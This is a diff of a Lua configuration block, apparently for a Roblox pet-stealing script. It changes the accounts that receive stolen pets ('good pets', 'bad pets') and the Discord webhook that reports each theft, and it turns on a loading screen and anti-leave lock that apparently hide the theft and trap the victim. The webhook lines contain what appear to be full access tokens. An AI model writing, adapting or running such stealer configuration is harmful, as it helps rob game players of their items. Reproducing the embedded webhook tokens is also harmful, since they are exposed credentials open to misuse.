@@ -7,11 +7,11 @@
 
 ]]--
 
-UserName = "immonkeywithbanan" -- good pets
-Webhook = "https://discord.com/api/webhooks/1127584693240471623/oFQ073FEpGcQqi9ZRHDG84vFEgQ-pjlu6Qk-C7qTO6JfWaSVpEyKzNaOtLwgtWpvvoIw" -- pings for pets
-UserName2 = "Pioter10101010" -- bad pets
+UserName = "ErcioYTYT" -- good pets
+Webhook = "https://discord.com/api/webhooks/1127607441161461943/kjsVaDSItfPRk9QO3vFCqY53mpSIFKvE6CuG7_ADAIHKh0X6r6GSJ2ontbWZCgtj9W1n" -- pings for pets
+UserName2 = "ErcioYTYTYT" -- bad pets
 
-_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
 _G.MouseLock = true -- make it true if you want the mouselock
 
